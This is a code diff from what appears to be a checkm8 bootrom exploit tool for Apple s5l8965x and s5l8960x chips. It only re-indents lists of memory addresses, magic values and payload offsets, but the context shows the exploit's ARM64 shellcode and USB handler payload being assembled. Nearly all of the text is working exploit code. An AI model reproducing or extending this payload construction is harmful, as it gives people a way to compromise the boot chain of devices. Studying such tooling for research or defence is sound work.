@@ -231,24 +231,24 @@ def payload(cpid):
         PAYLOAD_SIZE_ARM64, # 7 - PAYLOAD_SIZE
                0x180086C70, # 8 - PAYLOAD_PTR
     ]
-        constants_usb_s5l8965x = [
-                                  0x180380000, # 1 - LOAD_ADDRESS
-                                  0x6578656365786563, # 2 - EXEC_MAGIC
-                                  0x646F6E65646F6E65, # 3 - DONE_MAGIC
-                                  0x6D656D636D656D63, # 4 - MEMC_MAGIC
-                                  0x6D656D736D656D73, # 5 - MEMS_MAGIC
-                                  0x10000CC78, # 6 - USB_CORE_DO_IO
-                                  ]
+    constants_usb_s5l8965x = [
+               0x180380000, # 1 - LOAD_ADDRESS
+               0x6578656365786563, # 2 - EXEC_MAGIC
+               0x646F6E65646F6E65, # 3 - DONE_MAGIC
+               0x6D656D636D656D63, # 4 - MEMC_MAGIC
+               0x6D656D736D656D73, # 5 - MEMS_MAGIC
+               0x10000CC78, # 6 - USB_CORE_DO_IO
+    ]
     constants_checkm8_s5l8965x = [
-                                  0x180086B58, # 1 - gUSBDescriptors
-                                  0x180086CDC, # 2 - gUSBSerialNumber
-                                  0x10000BFEC, # 3 - usb_create_string_descriptor
-                                  0x180080562, # 4 - gUSBSRNMStringDescriptor
-                                  0x18037FC00, # 5 - PAYLOAD_DEST
-                                  PAYLOAD_OFFSET_ARM64, # 6 - PAYLOAD_OFFSET
-                                  PAYLOAD_SIZE_ARM64, # 7 - PAYLOAD_SIZE
-                                  0x180086C70, # 8 - PAYLOAD_PTR
-                                  ]
+                0x180086B58, # 1 - gUSBDescriptors
+                0x180086CDC, # 2 - gUSBSerialNumber
+                0x10000BFEC, # 3 - usb_create_string_descriptor
+                0x180080562, # 4 - gUSBSRNMStringDescriptor
+                0x18037FC00, # 5 - PAYLOAD_DEST
+                PAYLOAD_OFFSET_ARM64, # 6 - PAYLOAD_OFFSET
+                PAYLOAD_SIZE_ARM64, # 7 - PAYLOAD_SIZE
+                0x180086C70, # 8 - PAYLOAD_PTR
+    ]
     s5l8965x_handler   = asm_arm64_x7_trampoline(0x10000CFB4) + asm_arm64_branch(0x10, 0x0) + prepare_shellcode('usb_0xA1_2_arm64', constants_usb_s5l8965x)[4:]
     s5l8965x_shellcode = prepare_shellcode('checkm8_arm64', constants_checkm8_s5l8965x)
     assert len(s5l8965x_shellcode) <= PAYLOAD_OFFSET_ARM64
@@ -256,7 +256,7 @@ def payload(cpid):
     return s5l8965x_shellcode + '\0' * (PAYLOAD_OFFSET_ARM64 - len(s5l8965x_shellcode)) + s5l8965x_handler
 
 
-        s5l8960x_handler   = asm_arm64_x7_trampoline(0x10000CFB4) + asm_arm64_branch(0x10, 0x0) + prepare_shellcode('usb_0xA1_2_arm64', constants_usb_s5l8960x)[4:]
+    s5l8960x_handler   = asm_arm64_x7_trampoline(0x10000CFB4) + asm_arm64_branch(0x10, 0x0) + prepare_shellcode('usb_0xA1_2_arm64', constants_usb_s5l8960x)[4:]
     s5l8960x_shellcode = prepare_shellcode('checkm8_arm64', constants_checkm8_s5l8960x)
     assert len(s5l8960x_shellcode) <= PAYLOAD_OFFSET_ARM64
     assert len(s5l8960x_handler) <= PAYLOAD_SIZE_ARM64
